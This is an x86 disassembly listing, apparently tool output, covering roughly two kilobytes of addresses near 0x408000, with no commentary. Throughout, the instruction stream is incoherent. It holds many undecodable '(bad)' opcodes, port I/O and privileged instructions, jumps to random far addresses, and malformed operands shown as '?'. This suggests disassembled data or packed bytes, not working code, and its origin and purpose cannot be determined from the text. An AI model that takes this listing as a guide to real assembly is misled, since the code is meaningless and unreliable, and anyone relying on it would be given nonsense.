  407f4d:	leave  
  407f4e:	or     ecx,DWORD PTR [ebx-0x35bb6b]
  407f54:	inc    DWORD PTR [ebx+0x840fcb]
  407f5a:	loopne 0x407f67
  407f5c:	add    BYTE PTR [eax],al
  407f5e:	sbb    DWORD PTR [esi-0xc],0xf
  407f62:	add    eax,0x58000099
  407f67:	enter  0xd4b5,0x31
  407f6b:	and    al,al
  407f6d:	dec    ebx
  407f6f:	mov    eax,ds:0xa231002b
  407f74:	add    eax,0x31e46e8
  407f79:	add    BYTE PTR [edx],bh
  407f7b:	loop   0x407fb3
  407f7d:	jns    0x407f27
  407f7f:	ins    BYTE PTR es:[edi],dx
  407f80:	mov    ebx,0x54adec8d
  407f85:	push   0x1a21a
  407f8a:	es push esi
  407f8c:	mov    esp,0x4b5c44ff
  407f91:	inc    ecx
  407f92:	xor    DWORD PTR [ebx+0x776974c3],edi
  407f98:	cmp    esp,edi
  407f9a:	push   es
  407f9b:	(bad)  
  407f9c:	cmp    ecx,DWORD PTR [ebx+0x70]
  407f9f:	mov    al,ds:0xa97dc00a
  407fa4:	inc    edx
  407fa5:	(bad)  
  407fa6:	mov    ah,0x60
  407fa8:	mov    esi,0x3a0e6ff
  407fad:	add    BYTE PTR [ecx],dh
  407faf:	push   ebp
  407fb0:	mov    eax,eax
  407fb2:	xlat   BYTE PTR ds:[ebx]
  407fb3:	(bad)  
  407fb4:	mov    edi,0x3775950
  407fb9:	rdtsc  
  407fbb:	mov    BYTE PTR [ebx-0x5fceff28],bl
  407fc1:	or     al,al
  407fc3:	cmp    al,0xb5
  407fc5:	cmp    BYTE PTR [ebp-0x40a98f],0x31
  407fcc:	aam    0xf
  407fce:	jmp    esp
  407fd0:	loopne 0x407f8f
  407fd2:	call   DWORD PTR [esi-0x649f6c1]
  407fd8:	pusha  
  407fd9:	add    ebp,ebx
  407fdb:	inc    edx
  407fdc:	dec    ebx
  407fdd:	sbb    bh,bh
  407fdf:	add    al,0xe4
  407fe1:	stos   DWORD PTR es:[edi],eax
  407fe2:	lock pop edi
  407fe4:	or     ecx,ebp
  407fe6:	add    ebp,DWORD PTR [esi+0x3c]
  407fe9:	and    DWORD PTR [ecx+ebx*2+0x4a03e9df],ebp
  407ff0:	add    DWORD PTR [esi],ecx
  407ff2:	cmp    DWORD PTR [ecx-0x5f],ebx
  407ff5:	daa    
  407ff6:	(bad)  
  407ff7:	xor    DWORD PTR [ecx],ecx
  407ff9:	ins    BYTE PTR es:[edi],dx
  407ffa:	mov    DWORD PTR [ebp-0x49],esi
  407ffd:	idiv   BYTE PTR [esi-0x33cb4a1f]
  408003:	aaa    
  408004:	mov    dh,0xe6
  408006:	stos   DWORD PTR es:[edi],eax
  408007:	lahf   
  408008:	fsubp  st(1),st
  40800a:	add    ebx,DWORD PTR [eax]
  40800c:	or     al,0xd6
  40800e:	mov    esi,0xcb94b61e
  408013:	pop    ss
  408014:	mov    dh,0xc6
  408016:	stos   DWORD PTR es:[edi],eax
  408017:	int    0xde
  408019:	jmp    0x130a3a21
  40801e:	int    0xf2
  408020:	pop    ebx
  408021:	bound  ebp,QWORD PTR [edi-0x6a334e00]
  408027:	push   ebx
  408028:	sbb    BYTE PTR [eax+0x3b],0x57
  40802c:	jg     0x407fb0
  40802e:	sub    al,0x10
  408030:	lods   al,BYTE PTR ds:[esi]
  408031:	sub    BYTE PTR [ecx+0x3],0x31
  408035:	or     DWORD PTR [edi+edx*1-0xc],esi
  408039:	or     cl,ch
  40803b:	add    esi,DWORD PTR [ecx]
  40803d:	adc    BYTE PTR [ecx-0x7e381676],0x5
  408044:	test   al,0x4b
  408046:	push   ebp
  408047:	mov    ch,BYTE PTR [ecx+eax*1]
  40804a:	jmp    0x9282:0x690d6fbc
  408051:	cmc    
  408052:	add    DWORD PTR [ebx+0x3201b1b2],edi
  408058:	aas    
  408059:	or     al,BYTE PTR [edx+0x7b]
  40805c:	icebp  
  40805d:	or     BYTE PTR [eax],al
  40805f:	jmp    0xeb036296
  408064:	mov    edx,0xbd1545b5
  408069:	pop    ebp
  40806a:	cmp    BYTE PTR [ecx+ebp*1-0x47],ch
  40806e:	(bad)  
  40806f:	out    dx,eax
  408070:	xor    eax,0x6f8644ea
  408075:	dec    esi
  408076:	add    al,0x70
  408078:	fcmovnb st,st(3)
  40807a:	out    dx,eax
  40807b:	es in  al,dx
  40807d:	add    dh,bh
  40807f:	adc    eax,0xa7c790b8
  408084:	es aas 
  408086:	push   esp
  408087:	sbb    eax,DWORD PTR [eax]
  408089:	inc    ebp
  40808a:	mov    ah,0x75
  40808c:	int    0xe4
  40808e:	or     BYTE PTR ds:[esi+esi*2-0x47],ah
  408093:	push   eax
  408094:	sar    DWORD PTR [esi],0x9
  408097:	add    cl,ch
  408099:	into   
  40809a:	jb     0x4080a0
  40809c:	jmp    0x34cb89d3
  4080a1:	and    eax,0x540fa5b8
  4080a6:	dec    edi
  4080a7:	pop    ecx
  4080a8:	inc    edx
  4080a9:	(bad)  
  4080aa:	ret    0xedc2
  4080ad:	xor    bl,BYTE PTR [esi-0x75]
  4080b0:	test   DWORD PTR [eax+0x7c37fccd],esi
  4080b6:	pop    ecx
  4080b7:	push   ebx
  4080b8:	sbb    BYTE PTR [ebx-0x80],ah
  4080bb:	jne    0x4080aa
  4080bd:	mov    ecx,0x76620836
  4080c2:	sbb    DWORD PTR [ecx+0x780f124],ecx
  4080c8:	jb     0x4080d6
  4080ca:	or     eax,0x803aae8b
  4080cf:	push   edi
  4080d0:	in     eax,0xa9
  4080d2:	mov    dl,0x33
  4080d4:	push   ebx
  4080d5:	nop
  4080d6:	scas   eax,DWORD PTR es:[edi]
  4080d7:	xor    eax,DWORD PTR [eax]
  4080d9:	repnz add DWORD PTR [edi+eax*1-0x2895d390],0xffffff8b
  4080e2:	push   cs
  4080e3:	rol    eax,0x8f
  4080e6:	or     ebx,eax
  4080e8:	mov    edx,DWORD PTR [ebx]
  4080ea:	mov    edx,0x100023f8
  4080ef:	mov    edx,0x1ddc8df8
  4080f4:	push   esi
  4080f5:	mov    bh,0xf
  4080f7:	add    edx,DWORD PTR gs:[esi+0x5c]
  4080fb:	mov    edx,0x8bd85b0c
  408101:	clc    
  408102:	jnp    0x408175
  408104:	and    edi,edx
  408106:	jnp    0x408179
  408108:	lea    ecx,[edi+eiz*1+0x2c2070d1]
  40810f:	or     cl,BYTE PTR [esi+0x8]
  408112:	leave  
  408113:	(bad)  
  408114:	adc    DWORD PTR [ebx],eax
  408116:	rol    BYTE PTR [eax-0x570fcc06],cl
  40811c:	clc    
  40811d:	xor    esi,eax
  40811f:	sbb    BYTE PTR [edi+ebx*1-0x3e423a0a],0xb
  408127:	push   esi
  408128:	or     al,0xc1
  40812a:	fwait
  40812b:	sbb    eax,0x6f63d903
  408130:	xor    edi,edx
  408132:	jmp    0x4081a4
  408134:	xor    edi,edx
  408136:	jne    0x4080c4
  408138:	pop    es
  408139:	scas   eax,DWORD PTR es:[edi]
  40813a:	(bad)  
  40813b:	repz hlt 
  40813d:	add    ecx,DWORD PTR [esi]
  40813f:	sbb    eax,0x8cfc0c1
  408144:	ret    
  408145:	mov    eax,DWORD PTR [ebx-0x47]
  408148:	clc    
  408149:	and    edx,DWORD PTR [eax]
  40814b:	mov    ecx,0x1d1c8df8
  408150:	sub    al,dh
  408152:	add    BYTE PTR [ecx],dh
  408154:	and    eax,DWORD PTR [ebx+eax*1-0x1]
  408158:	mov    ebp,0x9f3dc2c2
  40815d:	ror    DWORD PTR [ebx+0x23b8ae89],cl
  408163:	jnp    0x408113
  408165:	mov    eax,0x10d2a58d
  40816a:	inc    esi
  40816b:	and    DWORD PTR [edx+0x0],ebx
  40816e:	dec    esi
  40816f:	dec    ecx
  408170:	loope  0x408133
  408172:	adc    DWORD PTR [edx],esi
  408174:	call   0x1a637c00
  408179:	loopne 0x408173
  40817b:	add    cl,BYTE PTR [edx]
  40817d:	mov    ds,WORD PTR [esi+eiz*1+0x3c4696a1]
  408184:	sahf   
  408185:	pop    ebp
  408186:	sbb    al,0x70
  408188:	ficom  WORD PTR [ebx+eax*1]
  40818b:	or     BYTE PTR [eax],bh
  40818d:	mov    ebp,0xbf002b33
  408192:	xor    ebx,DWORD PTR [ebx]
  408194:	add    BYTE PTR cs:[edi],0xf9
  408198:	cmp    BYTE PTR [ecx+ebp*2-0x3f1c1dce],al
  40819f:	icebp  
  4081a0:	stos   DWORD PTR es:[edi],eax
  4081a1:	push   es
  4081a2:	ret    
  4081a3:	stos   BYTE PTR es:[edi],al
  4081a4:	ja     0x40819d
  4081a6:	clc    
  4081a7:	push   edx
  4081a8:	js     0x4081a1
  4081aa:	clc    
  4081ab:	mov    esp,0xdeaf1334
  4081b0:	in     al,dx
  4081b1:	mov    es,WORD PTR [ebx]
  4081b3:	xchg   esp,eax
  4081b5:	(bad)
  4081b9:	lahf   
  4081ba:	ror    DWORD PTR [ebx+0x23be6fc9],cl
  4081c0:	retf   
  4081c1:	outs   dx,DWORD PTR ds:[esi]
  4081c2:	mov    esi,0x74abad8d
  4081c7:	pop    ebx
  4081c8:	mov    dh,0x23
  4081ca:	pop    es
  4081cb:	dec    esi
  4081cc:	pop    ecx
  4081cd:	or     DWORD PTR [eax],ebp
  4081cf:	lds    eax,FWORD PTR [eax+0x6]
  4081d2:	xor    ecx,DWORD PTR [edi-0x18af0965]
  4081d8:	cdq    
  4081d9:	not    BYTE PTR [eax-0x77]
  4081dc:	lods   eax,DWORD PTR ds:[esi]
  4081dd:	adc    al,BYTE PTR [edi-0x15801a2d]
  4081e3:	pop    ecx
  4081e4:	dec    ebp
  4081e5:	enter  0x122a,0x32
  4081e9:	shl    BYTE PTR [edx-0x43],1
  4081ec:	and    ch,BYTE PTR [edi-0x50dd4136]
  4081f2:	ins    BYTE PTR es:[edi],dx
  4081f3:	xor    BYTE PTR [esi],0xe7
  4081f6:	not    DWORD PTR [ebx-0xc58fa36]
  4081fc:	jno    0x4081c7
  4081fe:	out    dx,al
  4081ff:	push   es
  408200:	jb     0x408280
  408202:	add    dh,bh
  408204:	cmp    esi,esp
  408206:	lock idiv BYTE PTR [ecx]
  408209:	test   BYTE PTR [ebp+0x13],dl
  40820c:	ret    0x8137
  40820f:	mov    eax,0xc5155b32
  408214:	repz add al,0xea
  408217:	shr    DWORD PTR [edx+0xbf1ab0],cl
  40821d:	push   edx
  40821e:	scas   eax,DWORD PTR es:[edi]
  40821f:	cli    
  408220:	mov    esi,0x89ee84b4
  408225:	jb     0x408257
  408227:	pop    DWORD PTR [esi]
  408229:	addr16 icebp 
  40822b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40822c:	les    eax,FWORD PTR [eax+0x6]
  40822f:	mov    bl,0x8e
  408231:	jmp    0x408228
  408233:	mov    al,ds:0x90f5d9e6
  408238:	mov    BYTE PTR [ebp-0x7af437ef],dh
  40823e:	aas    
  40823f:	jmp    0x3211:0xaac80559
  408246:	rol    BYTE PTR [eax],1
  408248:	bound  esi,QWORD PTR [ebp-0xb]
  40824b:	cli    
  40824c:	retf   0xf5ec
  40824f:	clc    
  408250:	je     0x408278
  408252:	or     ah,BYTE PTR [edx+0x4]
  408255:	cmp    edi,DWORD PTR [ebx-0x376950fd]
  40825b:	shl    ah,0x37
  40825e:	(bad)  
  40825f:	mov    eax,DWORD PTR [edx+0x7f]
  408262:	mov    ecx,0xae874023
  408267:	lea    ebx,[ebp+0x23]
  40826a:	dec    ecx
  40826b:	mov    bl,0xa9
  40826d:	jb     0x408274
  40826f:	push   esi
  408270:	add    DWORD PTR [esi+eax*8+0x9],ebp
  408274:	jmp    0xe594:0xdaf87d82
  40827b:	cli    
  40827c:	fimul  DWORD PTR [edx+0xf68c83]
  408282:	fisttp QWORD PTR [esi+0x5e]
  408285:	(bad)  
  408286:	aaa    
  408287:	inc    ebx
  408288:	sub    al,0x28
  40828a:	ins    DWORD PTR es:[edi],dx
  40828b:	add    al,BYTE PTR [ebx]
  40828d:	and    edi,DWORD PTR [edi+0xce033b3]
  408293:	mov    ecx,0x8db6e333
  408298:	pop    ds
  408299:	xor    eax,0x77
  40829c:	jmp    0xc40aab8b
  4082a1:	(bad)  ds:0x4c08bd2
  4082a7:	mov    ah,0x23
  4082a9:	mov    bl,0xfc
  4082ab:	mov    cl,0x8d
  4082ad:	xor    BYTE PTR gs:[esi+0x10],cl
  4082b1:	(bad)  
  4082b2:	add    BYTE PTR ds:0xc9f3f546,cl
  4082b8:	add    eax,0xfb84edea
  4082bd:	fimul  DWORD PTR [edx-0x74ff0714]
  4082c3:	ins    DWORD PTR es:[edi],dx
  4082c4:	lea    edx,[edi+eiz*8-0x35bbebab]
  4082cb:	add    eax,0xc7d92856
  4082d0:	or     DWORD PTR [ebx],eax
  4082d2:	push   0x1233f87e
  4082d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082d8:	cli    
  4082d9:	xor    eax,DWORD PTR [eax]
  4082db:	mov    BYTE PTR [edi+ecx*1-0x275e94e7],cl
  4082e2:	fwait
  4082e3:	inc    edx
  4082e4:	cmp    al,0xc1
  4082e6:	add    BYTE PTR [ecx+0x3],cl
  4082e9:	add    ecx,edx
  4082eb:	adc    ebp,DWORD PTR [edi+0x33]
  4082ee:	stc    
  4082ef:	cmp    ebp,DWORD PTR [ebp+0x33]
  4082f2:	cli    
  4082f3:	fst    QWORD PTR [eax-0x29ec37e1]
  4082f9:	out    0x3,eax
  4082fb:	sahf   
  4082fc:	sbb    al,0xc1
  4082fe:	ret    
  4082ff:	inc    esp
  408300:	add    eax,0xb6318bd9
  408305:	cli    
  408306:	and    esi,DWORD PTR [edx]
  408308:	mov    dh,0xf8
  40830a:	(bad)  
  40830b:	les    ecx,FWORD PTR [ecx]
  40830d:	out    0xcd,al
  40830f:	cmp    DWORD PTR [edx+eax*1-0x3f33cbba],ebp
  408316:	add    eax,0xfb8bc50b
  40831b:	cmp    ebp,DWORD PTR [ebp+0x23]
  40831e:	stc    
  40831f:	sub    ebp,DWORD PTR [esi-0x73]
  408322:	xchg   esp,eax
  408323:	out    0xd9,eax
  408325:	pop    es
  408326:	aaa    
  408327:	retf   
  408328:	add    al,0x56
  40832a:	cmp    cl,cl
  40832c:	lds    ecx,FWORD PTR [ecx]
  40832e:	add    ecx,eax
  408330:	jl     0x40832a
  408332:	xor    edx,DWORD PTR [edx-0x6fcc055c]
  408338:	xchg   BYTE PTR [edi+ecx*1-0x2af9e0cf],cl
  40833f:	lds    esp,FWORD PTR [edx+0x60f00c49]
  408345:	or     DWORD PTR [ebx],eax
  408347:	jmp    0x408383
  408349:	mov    ebp,0xc2b80033
  40834e:	mov    ebx,0x974cab33
  408353:	pop    ds
  408354:	xchg   esp,eax
  408355:	lods   eax,DWORD PTR ds:[esi]
  408356:	pop    ebp
  408357:	inc    ebp
  408358:	xor    dh,BYTE PTR [eax-0x1d]
  40835b:	shl    BYTE PTR [edx-0x53],0x4
  40835f:	fnstcw WORD PTR [edx+0x52faf458]
  408365:	dec    esp
  408366:	hlt    
  408367:	clc    
  408368:	lods   al,BYTE PTR ds:[esi]
  408369:	and    eax,0x42880500
  40836e:	push   0x3
  408370:	div    DWORD PTR [ebp-0x5cd33f3e]
  408376:	les    ecx,FWORD PTR [ebx+0x23bbd25a]
  40837c:	pop    eax
  40837d:	sar    BYTE PTR [ebp+ecx*4-0x5c44495b],cl
  408384:	push   esi
  408385:	add    eax,0xe1295604
  40838a:	les    ecx,FWORD PTR [ecx]
  40838c:	xor    dl,BYTE PTR [edx]
  40838e:	mov    eax,?
  408390:	bound  edi,QWORD PTR [edx-0x579d051d]
  408396:	mov    DWORD PTR [esi+ebp*1-0x7190fd37],ecx
  40839d:	mov    ds:0x61f01c45,eax
  4083a2:	push   es
  4083a3:	add    edi,ebx
  4083a5:	cmp    edi,DWORD PTR [edx-0x43fc07cd]
  4083ab:	xor    edi,ebx
  4083ad:	and    eax,0xbb001f98
  4083b2:	or     al,0xea
  4083b4:	mov    WORD PTR [edx],?
  4083b6:	or     DWORD PTR [edi-0xc],eax
  4083b9:	icebp  
  4083ba:	retf   0x2f5
  4083bd:	clc    
  4083be:	adc    BYTE PTR [eax-0x6e05370d],0x89
  4083c5:	lods   eax,DWORD PTR ds:[esi]
  4083c6:	push   es
  4083c7:	sub    edi,ebp
  4083c9:	mov    eax,0x1d3deaae
  4083ce:	enter  0xa9,0x32
  4083d2:	retf   0xbb62
  4083d5:	bound  esi,QWORD PTR [eax-0x6a5343e6]
  4083db:	test   BYTE PTR [edi+ebx*4-0x18fc91c8],0xe8
  4083e3:	daa    
  4083e4:	ret    0xa3a
  4083e7:	sbb    DWORD PTR [ebx-0xcbe0587],ecx
  4083ed:	js     0x40846b
  4083ef:	gs pop es
  4083f1:	adc    ebp,DWORD PTR [eax]
  4083f3:	dec    esp
  4083f4:	sub    DWORD PTR [edx],esi
  4083f6:	aas    
  4083f7:	aad    0xc4
  4083f9:	jo     0x408414
  4083fb:	jmp    0x2bb:0xdab3aac9
  408402:	mov    al,0x5c
  408404:	cwde   
  408405:	es std 
  408407:	shl    BYTE PTR [eax-0x460f5c4],0x71
  40840e:	retf   0x2de
  408411:	or     BYTE PTR [edx+0x2800f2f0],al
  408417:	cli    
  408418:	loope  0x4083a2
  40841a:	mov    ch,0x5
  40841c:	and    eax,0xea64d7aa
  408421:	cmp    eax,0xffa9c835
  408426:	xor    ecx,edx
  408428:	jb     0x4083e4
  40842a:	inc    edx
  40842b:	mov    al,0xfa
  40842d:	mov    ebx,0xde0094a4
  408432:	pop    ebp
  408433:	mov    esi,0x573222de
  408438:	adc    BYTE PTR [eax-0x46fcfe10],ch
  40843e:	stos   DWORD PTR es:[edi],eax
  40843f:	mov    al,0x33
  408441:	xchg   edx,eax
  408442:	ret    
  408443:	scas   eax,DWORD PTR es:[edi]
  408444:	lea    ebx,[ebp+0x2f]
  408447:	sub    DWORD PTR [ebx+0x42],ecx
  40844a:	mov    WORD PTR [ecx],cs
  40844c:	dec    esi
  40844d:	fucomp st(5)
  40844f:	(bad)  
  408450:	adc    dl,ch
  408452:	js     0x4083d5
  408454:	cli    
  408455:	mov    edx,0x74f8f9ea
  40845a:	(bad)  
  40845b:	or     eax,0x6f1f9d70
  408460:	add    esi,DWORD PTR [edi-0x93c3766]
  408466:	xor    edx,eax
  408468:	mov    eax,DWORD PTR [eax-0x7d]
  40846b:	scas   eax,DWORD PTR es:[edi]
  40846c:	xor    eax,DWORD PTR [edx-0x57]
  40846f:	test   BYTE PTR [edi],al
  408471:	das    
  408472:	and    al,0x92
  408474:	sub    dl,ch
  408476:	and    al,0xf5
  408478:	shr    BYTE PTR [ecx],0x0
  40847b:	pop    esi
  40847c:	or     al,bl
  40847e:	jb     0x40841b
  408480:	stc    
  408481:	clc    
  408482:	fimul  DWORD PTR [edx-0x77096b85]
  408488:	in     eax,0xa0
  40848a:	adc    esi,DWORD PTR [ebx]
  40848c:	pop    ss
  40848d:	shr    DWORD PTR [ebx],0x2b
  408490:	or     dl,al
  408492:	(bad)  
  408493:	jmp    0x8c7e:0xe8bafaf8
  40849a:	neg    BYTE PTR [edi+0x30b5eef9]
  4084a0:	cmp    ecx,DWORD PTR [eax+ebp*4]
  4084a3:	repnz sbb DWORD PTR [ebx],eax
  4084a6:	mov    ds:0x33afb8,eax
  4084ab:	lock mov edx,0x16548df8
  4084b1:	add    eax,0x309501d
  4084b6:	pop    esi
  4084b7:	add    al,cl
  4084b9:	ret    
  4084ba:	pop    ss
  4084bb:	retf   
  4084bc:	iret   
  4084bd:	mov    edi,ecx
  4084bf:	sti    
  4084c0:	jb     0x4084f5
  4084c2:	sti    
  4084c3:	push   ebp
  4084c4:	mov    DWORD PTR [edi],eax
  4084c6:	cmp    DWORD PTR [eax+0xe03d9d9],ecx
  4084cc:	test   eax,0x9ccc0c0
  4084d1:	ret    
  4084d2:	mov    esp,DWORD PTR [ebx]
  4084d4:	mov    edx,0x842033f8
  4084d9:	xchg   esp,eax
  4084da:	pop    ss
  4084db:	in     eax,dx
  4084dc:	(bad)  
  4084dd:	(bad)  
  4084df:	add    BYTE PTR [ebx+0x5ac1303e],cl
  4084e5:	add    al,BYTE PTR [ebx]
  4084e7:	rcl    BYTE PTR [ebx],1
  4084e9:	ins    DWORD PTR es:[edi],dx
  4084ea:	xor    edi,ebx
  4084ec:	jnp    0x408560
  4084ee:	lea    ecx,[edi+eax*4-0x785d8390]
  4084f5:	or     DWORD PTR [esi+0x3c],ecx
  4084f8:	sbb    eax,ecx
  4084fa:	adc    BYTE PTR [ebx],al
  4084fc:	and    al,BYTE PTR [edx-0x45efcc06]
  408502:	clc    
  408503:	(bad)  
  408504:	les    edx,FWORD PTR ds:0xc9045665
  40850a:	add    ebx,DWORD PTR [esi+0x40]
  40850d:	mov    ebx,0xbfcf4b17
  408513:	jmp    DWORD PTR [edi]
  408515:	jne    0x408516
  408517:	xor    esp,DWORD PTR [edx]
  408519:	add    ebx,edi
  40851b:	xor    edx,DWORD PTR [ecx]
  40851d:	add    DWORD PTR [edi+eax*1-0xbd758b4],0x31
  408525:	lahf   
  408526:	std    
  408527:	shl    cl,0xa3
  40852a:	add    bl,al
  40852c:	mov    esi,0xf6ffb4c2
  408531:	scas   al,BYTE PTR es:[edi]
  408532:	mov    edx,0xb8aee90b
  408537:	lea    edi,[ebp+0xbff8cd2]
  40853d:	fild   WORD PTR [eax]
  40853f:	push   esi
  408540:	xor    eax,0xac161
  408545:	xor    dh,BYTE PTR [edx+0x74]
  408548:	inc    esi
  40854a:	jp     0x408500
  40854c:	xor    edi,DWORD PTR [edx-0x46cc464a]
  408552:	sbb    al,0x87
  408554:	(bad)  
  408556:	mov    esi,0xc32ab8f
  40855b:	cld    
  40855c:	shl    BYTE PTR [eax-0x4e],0x0
  408560:	retf   0x4ad6
  408563:	mov    ah,0xff
  408565:	mov    cs,WORD PTR [esi]
  408567:	mov    esp,0xba0e880b
  40856c:	lea    ebx,[ebp-0x5d60055e]
  408572:	in     eax,dx
  408573:	call   FWORD PTR [ebp+0x45]
  408576:	loope  0x408537
  408578:	adc    eax,0xff741932
  40857d:	pop    esi
  40857e:	loop   0x408533
  408580:	xor    ebx,DWORD PTR [ebx-0x4a]
  408583:	mov    eax,0x7f244833
  408588:	pop    es
  408589:	jb     0x408603
  40858b:	pop    eax
  40858c:	xor    bl,BYTE PTR gs:[ebx+esi*8-0x40]
  408591:	jno    0x408536
  408593:	add    bl,al
  408595:	out    dx,al
  408596:	mov    bl,0xb3
  408598:	jmp    DWORD PTR [esi]
  40859a:	jo     0x408556
  40859c:	or     ebx,DWORD PTR [ecx]
  40859e:	or     bl,BYTE PTR [edx]
  4085a0:	scas   eax,DWORD PTR es:[edi]
  4085a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085a2:	xchg   ebp,eax
  4085a3:	not    BYTE PTR [ebp+0x765fdfd]
  4085a9:	add    BYTE PTR [edi-0x3],bl
  4085ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4085ad:	(bad)  
  4085ae:	sub    eax,DWORD PTR [esi]
  4085b0:	cdq    
  4085b1:	jae    0x4085a9
  4085b3:	stos   BYTE PTR es:[edi],al
  4085b4:	mov    esi,0xe2ae22b3
  4085b9:	lods   eax,DWORD PTR ds:[esi]
  4085ba:	and    dh,BYTE PTR [ecx+0x2c2e805c]
  4085c0:	popf   
  4085c1:	mov    ds:0xdc2f06d6,eax
  4085c6:	icebp  
  4085c7:	enter  0x6e6,0xfb
  4085cb:	push   0xffffff8e
  4085cd:	mov    bl,0xbe
  4085cf:	stos   BYTE PTR es:[edi],al
  4085d0:	mov    edx,0xbab02aab
  4085d5:	lods   eax,DWORD PTR ds:[esi]
  4085d6:	mov    esp,0x4d4d68d
  4085db:	test   DWORD PTR [edi+eax*1-0x1],esp
  4085df:	add    al,0x28
  4085e1:	(bad)  
  4085e2:	cmp    al,0x6
  4085e4:	inc    eax
  4085e5:	jae    0x408575
  4085e7:	stos   BYTE PTR es:[edi],al
  4085e8:	push   esi
  4085e9:	mov    bl,0x42
  4085eb:	scas   eax,DWORD PTR es:[edi]
  4085ec:	loop   0x40859c
  4085ee:	inc    edx
  4085ef:	mov    al,0x74
  4085f1:	mov    BYTE PTR [esi],ch
  4085f3:	cmp    bh,BYTE PTR [edi-0x50fa21a5]
  4085f9:	jecxz  0x40866c
  4085fb:	leave  
  4085fc:	out    0x6,eax
  4085fe:	jb     0x40866a
  408600:	es mov bl,0x56
  408603:	stos   BYTE PTR es:[edi],al
  408604:	fisubr DWORD PTR [edx+edi*1-0x4b51254f]
  40860b:	xchg   ebp,eax
  40860c:	mul    BYTE PTR [ebx+0x6dd5700]
  408612:	pop    es
  408613:	fucomip st,st(4)
  408615:	daa    
  408616:	(bad)  
  408617:	cmp    eax,DWORD PTR [esi]
  408619:	add    BYTE PTR [ecx],bl
  40861b:	mov    ds:0xe3eeffaa,al
  408620:	cmc    
  408621:	cli    
  408622:	repnz (bad) 
  408624:	cmc    
  408625:	imul   DWORD PTR [esi+ecx*4-0x6]
  408629:	adc    ebp,DWORD PTR [edx]
  40862b:	sub    al,0x66
  40862d:	add    ebx,DWORD PTR [edi]
  40862f:	sub    eax,0x2ff6c1c8
  408634:	mov    edi,0xa9a3bebf
  408639:	(bad)  
  40863a:	cli    
  40863b:	call   0x9c7b:0x8cfaf8fd
  408642:	push   es
  408643:	dec    esp
  408644:	sbb    BYTE PTR [eax],cl
  408646:	das    
  408647:	ss dec ebx
  408649:	xor    al,0xa8
  40864b:	out    dx,eax
  40864c:	adc    eax,DWORD PTR [ebx]
  40864e:	mov    al,0x43
  408650:	stos   BYTE PTR es:[edi],al
  408651:	inc    DWORD PTR [esi-0xd060a7d]
  408657:	fcomip st,st(5)
  408659:	clc    
  40865a:	fs scas al,BYTE PTR es:[edi]
  40865c:	add    DWORD PTR [edx+0x3b207ef],eax
  408662:	scas   eax,DWORD PTR es:[edi]
  408663:	inc    edx
  408664:	enter  0xe7c0,0x37
  408668:	(bad)  
  408669:	mov    edi,0xffa9c356
  40866e:	sbb    cl,ah
  408670:	std    
  408671:	idiv   edx
  408673:	add    bh,al
  408675:	jnp    0x40860b
  408677:	(bad)  
  408678:	imul   esi,DWORD PTR [edi+0x532f743a],0xfe74282c
  408682:	add    bh,BYTE PTR [ecx]
  408684:	jecxz  0x40862f
  408686:	call   FWORD PTR [esi]
  408688:	xor    ebp,0xfffffffa
  40868b:	loop   0x408621
  40868d:	cmc    
  40868e:	neg    DWORD PTR [esi+edi*4-0x7]
  408692:	mov    edx,0x2acf1a00
  408697:	add    ebx,esi
  408699:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40869a:	rol    cl,0xf
  40869d:	adc    dl,cl
  40869f:	mov    edi,0xffff5b0f
  4086a4:	cmp    esi,DWORD PTR [ebp+0xb]
  4086a7:	stc    
  4086a8:	sub    esi,DWORD PTR [edi-0x73]
  4086ab:	pushf  
  4086ac:	(bad)  
  4086ad:	jnp    0x408682
  4086af:	xchg   bl,dh
  4086b1:	push   cs
  4086b2:	pop    esi
  4086b3:	and    al,0xc9
  4086b5:	into   
  4086b6:	adc    eax,0x7d269103
  4086bb:	or     cl,bl
  4086bd:	adc    DWORD PTR [ecx],eax
  4086bf:	pop    edi
  4086c0:	aam    0xb
  4086c2:	dec    edi
  4086c3:	or     cl,cl
  4086c5:	inc    ecx
  4086c6:	or     al,0xff
  4086c8:	sbb    eax,0x18768d59
  4086cd:	or     cl,BYTE PTR [ecx-0xa55df1]
  4086d3:	pop    edx
  4086d4:	adc    DWORD PTR [esi+0x58],edx
  4086d7:	pop    edi
  4086d8:	add    BYTE PTR [esi+0x64],cl
  4086db:	ret    0x980c
  4086de:	aas    
  4086df:	mov    ebp,esp
  4086e1:	or     edx,ecx
  4086e3:	clc    
  4086e4:	push   edi
  4086e5:	(bad)  
  4086e6:	cmp    eax,0xcec45c7
  4086eb:	add    BYTE PTR [eax],al
  4086ed:	cwde   
  4086ee:	pop    ecx
  4086ef:	jne    0x4086fd
  4086f1:	fisttp WORD PTR [edi-0x8]
  4086f4:	mov    DWORD PTR [ebp+0x58418cac],0x7745230b
  4086fe:	rol    DWORD PTR ds:0x4bfd24,1
  408704:	mov    DWORD PTR [ebx],eax
  408706:	push   0xc455c7ef
  40870b:	mov    WORD PTR [ecx+0x31],es
  40870e:	mov    dl,0xb1
  408710:	fdivr  QWORD PTR [ebx+0x1a]
  408713:	leave  
  408714:	add    eax,0x431d05
  408719:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40871a:	jle    0x408711
  40871c:	pmaxsw mm6,QWORD PTR [ebx+esi*8-0x4c4d8f74]
  408724:	loope  0x408729
  408726:	jae    0x4086c4
  408728:	sbb    al,0xba
  40872a:	in     al,dx
  40872b:	sti    
  40872c:	add    ch,BYTE PTR [esi+edi*4+0x1d]
  408730:	inc    eax
  408731:	mov    esi,edi
  408733:	jle    0x408776
  408735:	xor    DWORD PTR [edx],eax
  408737:	pushf  
  408738:	inc    eax
  408739:	aam    0x66
  40873b:	mov    al,0x83
  40873d:	add    BYTE PTR [esi+ebx*2+0x43],ch
  408741:	call   0x443933
  408746:	mov    dl,0xfc
  408748:	stos   DWORD PTR es:[edi],eax
  408749:	inc    eax
  40874a:	inc    edx
  40874b:	push   0x32c95d7c
  408750:	les    eax,FWORD PTR [eax-0x56]
  408753:	in     al,dx
  408754:	sti    
  408755:	add    ch,BYTE PTR [esi+ecx*4+0x54]
  408759:	push   0x423565
  40875e:	add    DWORD PTR [edx+0x369ee50a],ecx
  408764:	add    bl,BYTE PTR [ebp-0x6b]
  408767:	test   DWORD PTR [ebx+0x370bc34],0xf84ab280
